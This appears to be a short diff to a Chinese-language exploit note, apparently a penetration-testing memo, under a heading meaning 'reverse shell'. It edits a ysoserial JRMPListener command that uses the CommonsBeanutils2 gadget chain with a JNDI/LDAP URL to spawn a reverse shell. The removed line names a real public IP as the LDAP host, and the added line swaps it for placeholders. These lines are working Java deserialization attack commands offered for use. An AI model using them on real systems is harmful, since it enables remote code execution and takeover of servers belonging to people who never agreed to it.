@@ -72,8 +72,12 @@ Host: ip
 反弹shell：
 
 ```
-java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 "ldap://1.116.32.76:1389/Basic/Command/ReverseShell/{ip}/{port}"
+java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 "ldap://{ip}:{port}/Basic/ReverseShell/{ip}/{port}"
 ```
+
+
+
+
 
 
 
